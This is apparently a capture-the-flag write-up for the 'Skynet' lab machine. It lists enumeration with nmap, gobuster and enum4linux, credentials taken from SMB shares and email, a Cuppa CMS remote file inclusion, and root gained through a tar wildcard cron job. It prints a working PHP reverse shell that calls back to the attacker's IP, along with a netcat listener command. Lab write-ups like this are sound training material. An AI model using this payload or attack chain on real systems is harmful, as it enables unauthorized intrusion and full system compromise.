-  used `nmap` to enumerate open ports.
-  there was a port open for smb (port 445)
- I also used `gobuster` to enumerate directories, found `/squirrelmail 
-  I enumerated smb and stored the output in `enum4linux.txt` with `enum4linux -a skynet.thm | tee enum4linux.txt`
-  I used `smbclient //skynet.thm/anonymous -I 10.10.86.85` to get access to the share, I found `log1.txt` which is a wordlist for the user `milesdyson`, the password for [squirrelmail](https://www.squirrelmail.org/)was `cyborg007haloterminator`
- in one of the emails I found the password for milesdyson's smb share
- I accessed milesdyson's smb share and I found the secret directory which is: `/45kra24zxs28v3yd`
- later on I used `gobuster` to enumerate directories for `/45kra24zxs28v3yd`, found `/administrator` which uses [Cuppa](https://www.cuppacms.com/), a CMS (Content Management System)
- i found a local and remote file inclusion vulnerability on Cuppa: https://www.exploit-db.com/exploits/25971
- i could read the server's files through this vulnerability.
- i created a php file which sends a connection to my machine and spawns a shell and I set up a listener on my machine with `nc -lnvp 6969` (Reverse Shell).
```php
<?php

system("php -r '\$sock=fsockopen(\"10.21.55.48\",6969);exec(\"/bin/sh -i <&3 >&3 2>&3\");'");
?>
```
- I opened a web server with `python -m http.server 80`, so i can use `http://10.21.55.48/malicious.php`
- I made the target machine execute my php script through the vulnerability specified above
- I successfully spawned a shell and gained better control over the target machine.
- I got the user.txt flag
- i used `linpeas.sh` for enumerating possible privilege escalation paths. With this tool i found a root cron job that executes every minute. 
- the cron job creates a backup the web server's files. It changes the working directory to `/var/www/html` It uses the following command: `tar cf /home/milesdyson/backups/backup.tgz *`
- i found this article: https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa, it explains nicely how you can get root privileges through the `tar cf ... *` command.
- I waited for the cron job to execute and got root privileges
- i got the root.txt flag located in the `/root` folder
this whole process was recorded and uploaded to YouTube: https://www.youtube.com/watch?v=_YEADYwWO9E